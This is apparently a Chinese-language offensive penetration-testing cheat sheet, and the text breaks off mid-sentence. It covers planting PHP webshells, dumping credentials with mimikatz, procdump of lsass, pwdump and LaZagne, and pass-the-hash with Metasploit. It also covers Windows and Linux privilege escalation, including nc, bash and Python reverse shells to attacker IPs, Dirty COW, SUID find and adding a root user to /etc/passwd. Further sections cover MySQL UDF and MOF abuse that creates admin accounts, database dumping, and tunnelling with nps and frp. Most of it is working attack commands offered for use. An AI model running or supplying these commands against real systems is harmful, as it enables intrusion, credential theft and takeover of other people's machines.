①可以通过log 备份、差异备份拿WebShell②可以通过into outfile,into outfile函数(写入函数)将一句话木马写入，拿WebShell。③利用phpmyadmin 将木马导出，拿WebShell④利用连接外连的数据库拿WebShell
1. 要有file_priv权限2. 知道文件绝对路径 3. 能使用union 4. 对web目录有读权限5. 若过滤了单引号，则可以将函数中的字符进行hex编码 

xss和sql注入联合利用有些输入框对一些符号过滤不严密（如&lt;&gt;，所以一般存在xss的地方就可以这么利用）我们可以在这里输入一句话&lt;?php @eval($_POST[&#39;CE&#39;]);?&gt;，之后再用数据库注入，查询到文件into file成功插入一句话木马
IIS写权限拿WebShell有些网站的管理员在配置网站权限的时候疏忽，导致我们有写权限，这种漏洞需要用工具来利用，已经很少见了，有专门的利用工具（桂林老兵）。原理是通过找到有IIS 写入权限的网站（开启WebDeV），PUT进去一个.txt 格式的文件，目录必须有刻写的权限，如 image 文件夹，然后通过move 方法，把txt 格式的木马用move 成脚本格式。
远程命令执行拿WebShell在有php代码执行漏洞,例如一些框架漏洞的时候可以通过执行一些系统命令进行拿WebShell。执行命令行命令“写入如下内容到文件，会自动将创建木马文件并将一句话木马写入其中，使用菜刀连接即可。
echo ?php &quot;@eval($_POST[&#x27;CE&#x27;]);?&gt;&quot; &gt; x.php 

头像上传拿WebShell大概思路：①将大马放在文件夹中②将文件夹压缩成压缩文件（zip）③正常上传一个头像并且抓包④将数据包中图片头像的内容部分删掉⑤重新写入文件内容，将压缩文件写入到原本图片的位置⑥上传，之后返回包中会告诉我们绝对路径
管理员密码提取需要以管理员用户登录，才能提取密码
mimikatz工具读取当目标为WindowsXP-2012等操作系统时，通过以下命令可以直接提取到明文密码（需要以管理员身份登录）
mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpassWords&quot; exit&gt;123.txt#提升权限privilege::debug

当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文（可能出现问题）
1、修改注册表，让Wdigest Auth 保存明文口令
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

2、重启或注销登录，导出lsass.dmp
procdump64.exe -accepteula -ma lsass.exe lsass.dmp

3、然后拿到 mimikatz 文件夹执行命令读明文
sekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full



本地hash远程攻击1、获取sam文件中administrator的hash密码
使用pwdump工具获取密码
​	Windows PWDUMP tools
C:\Documents and Settings\Administrator\桌面\pwdump8-8.2\pwdump7&gt;PwDump7.exePwdump v7.1 - raw password extractorAuthor: Andres Tarasco Acunaurl: http://www.514.esAdministrator:500:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::SUPPORT_388945a0:1001:NO PASSWORD*********************:B7BF2AD63C27101B314C28578FE3F1B9:::IUSR_GOLD-DFD1EF44BA:1003:587598BDB5B2EA09B2D2D1539A5CC67F:5C79A5D27C799E4E033C396BDCEBD0ED:::IWAM_GOLD-DFD1EF44BA:1004:5858D28D62B2A756E9B758B2D3F45F97:1ABB238FC5AD200853D15FDC99B14207:::ASPNET:1006:CEBCC37474AA8AD3248733E5E96EA6DC:6D3A0F8AC892872D72EBFFD510F4BBEF:::test:1015:01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537:::C:\Documents and Settings\Administrator\桌面\pwdump8-8.2\pwdump7&gt;



2、利用msf提供的exploit&#x2F;windows&#x2F;smb&#x2F;psexec模块
msf &gt;use exploit/windows/smb/psexecmsf &gt;set RHOST 192.168.1.109msf &gt;set SMBUser administratormsf &gt;set SMBPass 44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4msf &gt;exploitmsf &gt;shell



使用LaZagne强烈推荐：可以获取所有的密码：浏览器密码、wifi密码等信息
[LaZagne][(https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe)]
1、安装依赖
pip install -r requirements.txt

2、基本使用
​	
#抓取所有支持软件的密码laZagne.exe all#抓取浏览器的密码：laZagne.exe browsers#把所有的密码写入一个文件：laZagne.exe all -oN -output D:\BaiduNetdiskDownload\LaZagne-master\LaZagne-master#解密域凭据（要解密域凭据，可以通过指定用户 Windows 密码的方式来完成。）：laZagne.exe all -password ZapataVive



Windows系统提权提权知识储备常见提权方法
1、 溢出漏洞提权2、 数据库提权3、 第三方软件提权

Cmd命令无法执行原因分析有时通过webshell连接上操作系统后，cmd命令可能无法执行，原因一般都是被管理员降权或删除、组件被删除。解决方法是通过脚本木马查找可读可写目录，上传cmd.exe，调用设定cmd路径（找可读可写目录不要选带空格目录）。
#设置cmd执行路径setp c:\xxx\vvv\cmd.exe

提权常用命令讲解whoami ——查看用户权限systeminfo ——查看操作系统，补丁情况ipconfig——查看当前服务器IP ipconfig /allnet user——查看当前用户情况netstat ——查看当前网络连接情况  netstat –ano  /netstat –an | find “ESTABLISHED”tasklist ——查看当前进程情况 tasklist /svctaskkill ——结束进程 taskkill -PID xxnet start  ——启动服务net stop ——停止服务hostname ——获取主机名称quser or query user ——获取在线用户netstat -ano | findstr 3389 ——获取rdp连接来源IPdir c:\programdata\ ——分析安装杀软wmic qfe get Caption,Description,HotFixID,InstalledOn ——列出已安装的补丁REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber ——获取远程端口tasklist /svc | find &quot;TermService&quot; + netstat -ano ——获取远程端口

系统溢出漏洞提权实战零、系统溢出漏洞提权分类：
远程溢出攻击者只需要与服务器建立连接，然后根据系统的漏洞，使用相应的溢出程序，即可获取到远程服务器的root权限。
本地溢出首先要有服务器的一个用户，且需要有执行的权限的用户才能发起提权，攻击者通常会向服务器上传本地溢出程序，在服务器端执行，如果系统存在漏洞，那么将溢出root权限

一、UAC绕过提权UAC（User Account Control）是微软在 Windows Vista 以后版本引入的一种安全机制，通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。当获得的权限是属于管理员组的时候但是并不是administrator这个用户，此时就可能需要我们进行绕过UAC的操作，否则虽然是管理员组但是实际上并没有管理员所对应的高权限操作,这个时候就需要bypass uac。
uac 绕过exp
#用kaliuse exploit/windows/local/askmeterpreter &gt; background  [*] Backgrounding session 1... msf5 exploit(multi/handler) &gt; use exploit/windows/local/ask msf5 exploit(windows/local/ask) &gt; set session 1 msf5 exploit(windows/local/ask) &gt; set lhost 192.168.60.79 msf5 exploit(windows/local/ask) &gt; set lport 4444 msf5 exploit(windows/local/ask) &gt; set payload windows/meterpreter/reverse_tcp msf5 exploit(windows/local/ask) &gt; set technique exe msf5 exploit(windows/local/ask) &gt; exploit 其他exp:use exploit/windows/local/bypassuacuseexploit/windows/local/bypassuac

二、利用系统内核溢出漏洞提权此提权方法即是通过系统本身存在的一些漏洞，未曾打相应的补丁而暴露出来的提权方法，依托可以提升权限的EXP和它们的补丁编号，进行提升权限。
微软官方时刻关注漏洞补丁列表网址:https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017

比如常用的几个已公布的 exp：KB2592799、KB3000061、KB2592799

github中整理好的溢出提权exp：https://github.com/SecWiki/windows-kernel-exploitshttps://github.com/WindowsExploits/Exploitshttps://github.com/AusJock/Privilege-Escalation
如何判断可用的漏洞
快速查找操作系统未打补丁脚本可以最安全的减少目标机的未知错误，以免影响业务。 命令行下执行检测未打补丁的命令如下：
systeminfo&gt;micropoor.txt&amp;(for \%i in ( KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type micropoor.txt|@find /i &quot;\%i&quot;|| @echo \%i you can fuck)&amp;del /f /q /a micropoor.txt

MSF后渗透扫描：
post/windows/gather/enum_patches

Powershell扫描：
Import-Module C:\Sherlock.ps1Find-AllVulns

三、利用SC将administrator提权至system试用版本：windows 7、8、03、08、12、16
关于sc命令：SC 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于“控制面板”中“管理工具”项中的“服务”。
sc Create syscmd binPath= “cmd /K start” type= own type= interactsc start systcmd


命令含义：创建一个名叫syscmd的新的交互式的cmd服务然后执行sc start systcmd，就得到了一个system权限的cmd环境

四、利用不带引号的服务路径检测方法
wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;

Windows命令解释程序可能会遇到名称中的空格，并且没有包装在引号中的时候。就有可能出现解析漏洞。如开机自启动中有程序路径C:\Program Files\Vulnerable.exe,其中存在空格，此时在C盘根目录上传Program.exe文件时，可能会被目标开机自启动。如果无效，还可以尝试在C:\Program Files路径下上传Vulnerable.exe文件。
C:\Program.exeC:\Program Files\Vulnerable.exeC:\Program Files\Vulnerable Service\Sub.exeC:\Program Files\Vulnerable Service\Sub Directory\service.exe

可以使用以下命令查看错误配置的路径
wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;

五、利用不安全的服务权限⚫即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它。AccessChk工具可以用来查找用户可以修改的服务：
accesschk.exe -uwcqv “Authenticated Users” * /accepteulaaccesschk.exe -uwcqv “user” *

sc命令也可以用来查找用户可以修改的服务：
#查找可以修改的服务sc qc “Service”  sc config xxx binpath= “net user rottenadmin P@ssword123! /add”sc stop xxxsc start xxx

每当我们开启服务时sc命令都返回了一个错误。这是因为net user命令没有指向二进制服务，因此SCM无法 与服务进行通信，通过使用执行自动迁移到新进程的payload，手动迁移进程，或者在执行后将服务的bin路径设置回原始服务二进制文件，可以解决这个问题。或者我们在权限允许的情况下，将我们的木马放到服务目录下，并重命名为服务启动的应用名称。电脑重启时即可获得一个system的shell
完整案例：①、利用系统自带的 DcomLaunch服务测试(此服务Power User组低权可操作)
#查询DcomLaunch的详细信息sc qc DcomLaunch#查看服务是否启动net start | find &quot;DCOM Server Process Launcher&quot;  #运行 tasklist /svc  找到对应服务tasklist /svc

②、修改服务并获取系统权限
这里要配置使用nc反弹shell到我的攻击机上，把nc放到c:\windows\temp目录下，使用sc对服务进行修改
sc config DcomLaunch binpath= &quot;C:\wmpub\nc.exe -nv 192.168.32.194 4433 -e C:\WINDOWS\system32\cmd.exe&quot;  

⛔注意binpath=后面一定要有个空格，IP为攻击者IP
③、查看是否第二步成功
sc qc DcomLaunch 

④、配置账号密码
sc config DcomLaunch obj= &quot;.\LocalSystem&quot;  password= &quot;&quot;

obj：指定运行服务将使用的帐户名，或指定运行驱动程序将使用的 Windows 驱动程序对象名。默认设置为 LocalSystem。password：指定一个密码。如果使用了非 LocalSystem 的帐户，则此项是必需的。
⑤、重启服务
net start DcomLaunch 

⑥、攻击机上用nc进行监听4433即可得到反弹的shell
nc.exe -vv -l -p 4433

六、计划任务如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序，这样在下次计划执行时，就会以高权限来运行恶意程序。
#查看计算机的计划任务schtasks /query /fo LIST /v#查看指定目录的权限配置情况accesschk.exe -dqv &quot;D:\test&quot; -accepteula

七、Meterpreter基础提权首先在Meterpreter会话执行ps命令查看目标机当前进程：假设此处看到了一个进程，运行账户是域管理员，我们可以再第一栏找到对应的进程PID，假设PID为2584：然后我们可以执行以下语句窃取该用户进程的令牌：
steal_token  2584

溢出漏洞安全防范及时通过Windows Update或第三方工具360更新补丁
提权后获取管理员密码虽然我们已经有了管理员权限，但是我们最好是再获取管理员密码，原因如下

很多管理员账号密码都设置成一样的，攻下一台就可以拿下所有
远程连接时，比如使用木马，很容易被发现或者清理
如果用管理员账号，可以清除渗透痕迹
正规渗透测试过程中，都是取得管理员账号密码，登录3389端口或反端口连接者证明为成功


简单地说就是从获取管理员权限——&gt;获取管理员账号

1、本地管理员密码如何直接提取①、直接通过mimikatz读取管理员密码
mimikatz，很多人称之为密码抓取神器，它的功能很多，最重要的是能从 lsass.exe进程中获取windows的账号及明文密码——这是以前的事了，微软知道后已经准备了补丁，lsass进程不再保存明文口令。Mimikatz 现在只能读到加密后的密码。win10无效

# 提升权限privilege::debug# 抓取密码sekurlsa::logonpassWords

当无法上传mimikatz工具到目标服务器时，可以利用procdump把lsass进程的内存文件导出本地，再在本地利用mimikatz读取密码，具体步骤如下
# 导出lsass.exe进程为lsass.dump文件procdump64.exe -accepteula -ma lsass.exe lsass.dmp sekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full

②、Lazagne 需要本地支持python
LaZagne项目是用于开源应用程序获取大量的密码存储在本地计算机上。每个软件都使用不同的技术（纯文本，API，自定义算法，数据库等）存储其密码。LaZagne 几乎支持市面上大部分常用工具。包括浏览器、Git、SVN、Wifi、Databases 等。但是对聊天软件的支持不够本土化，主要支持一些国外的聊天软件。

laZagne.exe all  #获取所有密码laZagne.exe browsers  #只获取浏览器记住的密码laZagne.exe all -oN  #将输出保存到文件    

-oN表示是纯文本格式（正常的）的输出，和屏幕打印内容相同；还可以写成-oJ，JSON格式的输出，更便于程序解析；或者写成-oA，同时输出两种格式。
2、本地Hash远程直接登录
高版本的系统，密码不是明文的情况下，直接通过哈希值来取得管理员账号。主要通过MSF提供的exploit&#x2F;windows&#x2F;smb&#x2F;psexec模块来完成
msf&gt;use exploit/windows/smb/psexecmsf&gt;set rhost #目标IP msf&gt;set SMBUser administrator  #目标账号msf&gt;set SMBPass aaaaaa:bbbbbb  #目标哈希值msf&gt;exploit msf&gt;shell

3、Hash密钥暴力破解

通过LC5暴力hash密码使用gmer直接提权SAM和system文件或用Pwdump7提取hash后，最后使用LC5破解
使用ophcrack破解系统hash密码http://simeon.blog.51cto.com/18680/122160

Linux系统提权当拿到了一台Linux服务器的低权限账号后，要通过技术手段提权至 root 用户权限，以执行更多的操作。首先关于Linux提权我们得先明白几个概念。
linux内核知识Linux内核版本号由3组数字组成：第一个组数字：内核主版本。 第二个组数字：偶数表示稳定版本；奇数表示开发中版本。第三个组数字：错误修补的次数。3.10.0就是内核版本号。3就是内核主版本，10表示是稳定版，0表示错误修补次数是0。
#使用以下命令也可以看到系统内核及版本的一些信息：uname -a                 #查看内核的具体信息cat /proc/version        #查看内核的具体信息cat /etc/centos-release  #查看centos发行版本cat /etc/redhat-release  #查看redhat发行版本

Linux提权方法总结Linux提权的前提：

拿到了一个低权限的账号
能上传和下载文件
机器上有python、java、perl等环境（非必须项）

一、Linux反弹提权**如果手里只有webshell可以利用反弹shell来得到一个shell，反弹的权限是中间件的权限。 **
1、NC反弹shellNC详情参考：https://www.cnblogs.com/nmap/p/6148306.html
①nc参数介绍
-l		指定nc将处于侦听模式，nc被当作server，侦听并接受连接。-p		&lt;port&gt;指定端口，老版本才需要-p-s		指定发送数据的源IP地址，适用于多网卡机-u		指定nc使用UDP协议，默认为TCP-v		输出交互或出错信息，新手调试时尤为有用-w		超时秒数，后面跟数字-z		表示zero，表示扫描时不发送任何数据

②nc做tcp监听
# 开启本地8080端口监听nc nc -l -p 80802

③nc反弹服务器shell
方法⑴：公网主机绑定SHELL
#在公网监听端口5555端口,并绑定shellnc -lp 5555 -t -e cmd.exe#在内网主动建立到外网IP:5555的连接nc -nvv x.x.x.x 5555

方法⑵：内网主机绑定SHELL
#在公网监听端口nc -lp 5555#在内网机器绑定shell反弹nc -t -e cmd x.x.x.x 5555

2、利用bash直接反弹（1） bash反弹一句话
#先公网监听nc -l -p 8080#在内网bash反弹bash -i &gt;&amp; /dev/tcp/x.x.x.x/8080 0&gt;&amp;1

网上还有很多方法一句话反弹shell，需要自行搜索
二、内核漏洞提权——脏牛
脏牛漏洞：又叫Dirty COW，存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。
漏洞范围：Linux内核 &gt;&#x3D; 2.6.22（2007年发行，到2016年10月18日才修复）
简要分析：该漏洞具体为，Linux内核的内存子系统在处理写入复制（copy-on-write, COW）时产生了竞争条件（race condition）。竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。
exp：https://github.com/gbonacini/CVE-2016-5195

示例：脏牛内核提权
首先确定发行版、内核版

cat /etc/issuecat /etc/*-releaseuname -a


根据内核版本，找exp，下载对应dirty.c文件编译

gcc -pthread dirty.c -o dirty -lcrypt


执行当前编译的dirty.c文件，然后输入新密码123456

./dirty#执行后，会将原来的passwd文件备份到/tmp目录#然后创建的新账号是firefart,密码123456


等创建成功后，切换到firefart用户会发现此用户会发现已经是root权限了。最好立刻再新建一个管理员账号，然后立刻恢复passwd文件。因为这个提权不是新建了一个账号，而已用新账号替换了root账号，所以要把root账号恢复回去

三、SUID提权SUID（设置用户ID）是赋予文件的一种特殊权限，拥有改权限的程序，任何用户执行的时候都是改命令都是以root权限执行的
suid提权是指这类有S权限的程序，如果能执行命令，那么我们就能从用改程序从普通用户提升到了root权限
SUID可用命令⑴在本地查找符合条件的文件，有以下三个命令
#尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;

⑵已知的可用来提权的linux可行性的文件列表如下：
nmapvimfindbashmorelessnanocp

示例：利用find文件提权假如我们现在拿到了一个网站服务器的shell，但是权限是ubuntu，我们现在需要提权到 root 用户权限。

查看具有root用户权限的SUID文件
find / -perm -u=s -type f 2&gt;/dev/null

发现有find命令，再确认一下
ls -lh /usr/bin/find#权限是rwsr-xr-x 确实有s权限

测试是否能用find命令以root权限运行
/usr/bin/find examples.desktop -exec whoami \;#发现确实可以以root权限运行

然后查看目标网站上是否的python环境linux服务器一般都自带python，区别是有些2.X,有些3.x

于是我们以root用户的身份利用python反弹shell，
#反弹一个sh类型的shellpython -c &#x27;import socket,subprocess,os; \  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \  s.connect((&quot;192.168.10.25&quot;,4444)); \  os.dup2(s.fileno(),0); \  os.dup2(s.fileno(),1); \  os.dup2(s.fileno(),2); \  p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;

远端nc监听nc -lvp 4444可以看到，在攻击端收到了反弹过来的shell，并且是root身份



本节来自：https://blog.csdn.net/qq_36119192/article/details/84872644

四、Linux配置错误提权利用Linux的配置文件错误，导致 &#x2F;etc&#x2F;passwd 文件可写入提权
对Linux配置进行检查的脚本有：https://www.securitysift.com/download/linuxprivchecker.pyhttp://pentestmonkey.net/tools/audit/unix-privesc-check
当我们获得了某个Linux服务器的低权限之后，我们想要对该低权限账号进行提权，以执行更多的操作。接下来我们的提权是利用 &#x2F;etc&#x2F;passwd 文件的可写入权限，导致我们写入一个其他用户进去。

查看 &#x2F;etc&#x2F;passwd 的权限，发现任何用户都可以读写。我们现在要做的就是自己构造一个用户，在密码占位符处指定密码，并且UID设置为0，将其添加到 &#x2F;etc&#x2F;passwd 文件中。

首先，使用perl语言生成带有盐值的密码：
perl -le &#x27;print crypt(&quot;password@123&quot;,&quot;addedsalt&quot;)&#x27;

然后将test用户的信息加入 &#x2F;etc&#x2F;passwd 文件
echo &quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt;/etc/passwd

以test/password@123登录主机登录成功后，是 root 权限。


五、定时任务提权系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root 用户的计划任务的。但是系统的计划任务/etc、cron*可以被列出。默认这些程序以root权限执行，如果有幸遇到一个把其中脚本配置成任意用户可写，我们就可以修改脚本进行提权了。

列出系统定时任务
ls -l /etc/cron*

查看列出的目录中，是否允许普通用户修改&#x2F;etc&#x2F;cron.daily 、&#x2F;etc&#x2F;cron.hourly、&#x2F;etc&#x2F;cron.monthly、&#x2F;etc&#x2F;cron.weekly 这四个文件夹内的文件，查看是否允许其他用户修改。如果允许任意用户修改，那么我们就可以往这些文件里面写入反弹shell的脚本提权了。


六、密码复用提权我们如果在主机上找到了其他应用或数据库的密码，那么很有可能root用户也用该密码，或者该参考该密码命名规则。那么就可以尝试一下 su root 来提权了。
数据库提权到操作系统攻击者如果获取了通过数据库root权限，是可以通过提权，获取操作系统最高权限的。
Mysql数据库提权如何获取mysql账号密码当通过webshell进入服务器后，怎么得到数据库的账号密码呢

查看网站配置文件。
如:conn、config、data、sql、common 、inc等。

查看数据库物理路径下的user表文件目录为&#x2F;data&#x2F;mysql&#x2F;user.myd和user.myi密码是加密的，需要再次进行破解

通过暴力破解得到（hscan、Bruter、hydra、脚本木马）如果对外开放3306，即允许远程连接，可以远程爆破补充：mysql开启root账号远程访问
mysql&gt; GRANT ALL PRIVILEGES ON*.*TO root@&quot;\%&quot;IDENTIFIED BY&quot;root&quot;;mysql&gt; flush privileges;

利用UDF自身提权

原理UDF提权是利用MYSQL的Create Function语句，将MYSQL账号转化为系统system权限。
利用条件
目标系统是Windows(Win2000,XP,Win2003)
已经拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数
有root账号和密码



利用方式A

使用工具“mysql综合利用工具”连接填写地址、root账号、密码后进行连接


导入udf.dll文件连接成功后，导出DLL文件，导入时请勿必注意导出路径（一般情况下对任何目录可写，无需考虑权限问题），否则在下一步操作中你会看到”No paths allowed for shared library”错误。
#不同版本mysql，udf.dll存放路径不同#Mysql版本大于5.1版本。xx\\mysql\\lib\\plugin\\udf.dll 文件夹下。#Mysql5.1版本默认路径。C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin\\udf.dll#Mysql版本小于5.1版本。Windows2003下放置于c:\\windows\\system32\\udf.dllwindows2000下放置于c:\\winnt\\system32\\udf.dll

一般Lib、Plugin文件夹需要在webshell先手工建立（也可用NTFS ADS流模式突破进而创建文件夹）
```sql#查找到mysql的目录后

select @@basedir;
#利用NTFS ADS创建lib目录

select ‘It is dll’ into dumpfile ‘C:\ProgramFiles\MySQL\MySQL Server 5.1\lib::$INDEX_ALLOCATION’;
#利用NTFS ADS创建plugin目录select &#x27;It is dll&#x27; into dumpfile &#x27;C:\\ProgramFiles\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#x27;; ```


UDF提权常用命令:
#创建cmdshell函数，如果用3389就需要创建open3389函数，具体有哪些函数看帮助create function cmdshell returns string soname &#x27;udf.dll&#x27;; #创建好函数后，用函数执行系统命令select cmdshell(&#x27;net user&#x27;);select open3389();drop function cmdshell; 删除函数delete from mysql.func where name=&#x27;cmdshell&#x27;  删除函数

使用完成后你可能需要删除在第二步中导出的DLL，但在删除DLL前请先删除你在第三步中创建的函数，否则删除操作将失败，删除第三步中创建的函数的SQL语句为：drop function 创建的函数名；


利用方式B
UDF脚本提权,当mysql不能远程连接时，可以上传udf脚本至对方主机，然后通过webshell的方式进行连接操作。
利用mof提权MOF漏洞工具与脚本实战：http://www.myhack58.com/Article/html/3/8/2013/38264.htm

原理在windows平台下，c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要将要做的事通过代码存储到这个mof文件中，就可以实现权限提升。
利用条件
mysql用户具有root权限
且可以复制文件到c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下
关闭了secure-file-priv



利用方式1通过工具如“mysql综合利用工具”直接提取，输入账户密码连接数据库后可直接输入系统命令，创建账号。
利用方式2
通过上传mof文件，然后在sql中运行的方式

找个可写目录，上传mof文件
假设上传的目录为文件夹C:\\wmpub\\moon.mof该mof文件，已经写死了要创建的账号密码等信息

执行sql，转移文件到系统目录，等待创建新账号
select load_file(&#x27;C:\\wmpub\\moon.mof&#x27;) into dumpfile &#x27;c:/windows/system32/wbem/mof/moon.mof&#x27;;

执行完后，验证账号在webshell里执行使用net user查看是否多了一个admin用户，如果有则说明可以利用，否则就不需要继续了，注意新建的帐号每隔5分钟就会新建帐号，删除帐号的办法参考上文链接


通过Mysql把文件写入启动项
通过mysql数据库命令写入VBS脚本；
mysql&gt;drop database test1;mysql&gt; create database test1;mysql&gt; use test1;mysql&gt; create table a (cmd text);mysql&gt;insert into a values (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;)&quot;);mysql&gt;insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user best best /add&quot;&quot;,0)&quot;);mysql&gt;insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup Administrators best /add&quot;&quot;,0)&quot;);#注意双引号和括号以及后面的“0”一定要输入！我们将用这三条命令来建立一个VBS的脚本程序

2. 直接通过Webshell的Mysql写入启动项；    ```sql    mysql&gt;select * from a;    mysql&gt;select * from a into outfile &quot;c://docume~1//administrator//「开始」菜单//程序//启动//best.vbs&quot;;


通过MS12-020、MS15-034重启服务器。服务器down机后，管理员会重启，重启后我们就能得到新建的管理员账号了

微软Mssql提权mssql提权主要分为弱口令与溢出两类提权。目前主要通过弱口令连接直接提权，溢出类Mssql数据库几乎很少见（sqlserver2000之后就几乎没有了）。
通过漏洞拉到webshell之后，找到网站配置文件，里面有sa权限的账号密码，配置文件为asp或者aspx网站一般使用微软自带数据库，这个提权没有sa权限是不能做的，mssql一般是允许远程连接的，系统库是master。有了sa密码直接利用sqltools工具就可以了
如何通过Oracle提权Oracle数据库一般与jsp、aspx网站搭配，如果是jsp网站，默认是系统权限，aspx网站默认需要提权。
提权方法参考：http://blog.csdn.net/sezvboyrul/article/details/2855401,工具为`oracleshell`
数据库安全防范
限止数据库远程连接，给数据库帐户设置密码必须&gt;8位以上并数字+字母+特殊符号等。
不要给网站配置root或SA权限。必须给每个网站独立分配数据库帐户并限格控制好权限。
及时升级数据库补丁。
安装Waf进行防御。
购买数据库审计设备

数据库脱库工具脱库通过百度查找Navicat Mysql、Navicat for SQL Server、Navicat for Oracle、Navicat for PostgreSQL、Navicat for SQLite等，也可以使用其它工具代替，如sqlmap、k8等类似工具。优点： 支持面广，功能强大，速度度、稳定缺点： 不能支持外链
脚本脱库通过百度查找ASP、PHP、JSP脱库脚本等类似工具。优点： 解决不外链的情况缺点： 速度慢、不够稳定
站点打包通过百度查找ASP、PHP、JSP脚本打包程序等类似工具。asp+access源码和数据库是可以一起打包，其它类型数据库，库与源码是单独分开的。
内网穿透【蓝队技能】【内网隧道工具流量分析】FRP&amp;NPS&amp;reGeorg&amp;Venom_frp流量分析-CSDN博客
nps逆向穿透项目地址：https://github.com/ehang-io/nps/releases
实验架构图




1、nps配置（双网卡主机）
#安装相关依赖（需要管理员权限）C:\neiwang\windows_amd64_server\nps.exe install#启动nps服务（需要管理员权限）C:\neiwang\windows_amd64_server\nps.exe starthttp://192.168.138.132:8080/login/index账号 admin  密码 123






端口映射创建隧道实现内网PC机的端口映射


2、npc配置
#客户端开启服务./npc.exe -server=192.168.138.132:8024 -vkey=123456 -type=tcp










使用外网服务器远程连接192.168.138.132:8022端口






流量转发nps创建socks代理




使用Proxifier代理
创建代理服务器




创建代理服务器
启动代理规则








配置当访问192.168.50.0-192.168.50.255使用代理服务器
使用本机测试是否能ping通




但是无法ping通C主机。


验证成功！
frp反向代理穿透GitHub：https://github.com/fatedier/frp/releases




1、服务端配置
[common]bind_port = 7000token = 123456dashboard_port = 7500dashboard_user = admindashboard_pwd = adminenable_prometheus = true



启动frpc(不同操作系统，配置文件不同)
frps.exe -c frps.toml
访问http://192.168.138.132:7500/

2、客户端配置
将frpc.exe和frpc.toml上传到客户端
修改frpc.exe
# 客户端配置[common]server_addr = 服务器ip# 与frps.ini的bind_port⼀致server_port = 7000# 与frps.ini的token⼀致token = 123456# 配置ssh服务[ssh]type = tcplocal_ip = 127.0.0.1local_port = 22# 这个⾃定义，之后再ssh连接的时候要⽤remote_port = 6000#rdp配置远程连接[rdp]type = tcplocal_ip = 127.0.0.1local_port =3389remote_port = 7002# 配置http服务，可⽤于⼩程序开发、远程调试等，如果没有可以不写下⾯的[web]type = httplocal_ip = 127.0.0.1local_port = 8080# web域名subdomain = test.hijk.pw# ⾃定义的远程服务器端⼝，例如8080remote_port = 8080



上⾯frpc.ini的rdp字段都是⾃⼰定义的规则，⾃定义端⼝对应时格式如下。
[xxx]”表示⼀个规则名称，⾃⼰定义，便于查询即可。“type”表示转发的协议类型，有TCP和UDP等选项可以选择，如有需要请⾃⾏查询frp⼿册。“local_port”是本地应⽤的端⼝号，按照实际应⽤⼯作在本机的端⼝号填写即可。“remote_port”是该条规则在服务端开放的端⼝号，⾃⼰填写并记录即可。





RDP
即Remote Desktop 远程桌⾯，Windows的RDP默认端⼝是3389，协议为TCP，建议使⽤frp远程连接前，在局域⽹中测试好，能够成功连接后再使⽤frp穿透连接。



配置完成frpc.ini后，就可以运⾏frpc了,注意防⽕墙要放⾏remote_port端⼝
在cs的输⼊beacon命令启动客户端
cd C:frp
shell frpc.exe -c frpc.ini
启动后服务器端操作界⾯会回显⼀个连接

此时可以在局域⽹外使⽤相应程序访问 x.x.x.x:xxxx （IP为VPS的IP，端⼝为⾃定义的remote_port）即
可访问到相应服务
使⽤远程桌⾯进⾏连接

客户端后台运⾏及开机⾃启frpc运⾏时始终有⼀个命令⾏窗⼝运⾏在前台，影响美观，我们可以使⽤⼀个批处理⽂件来将其运⾏在
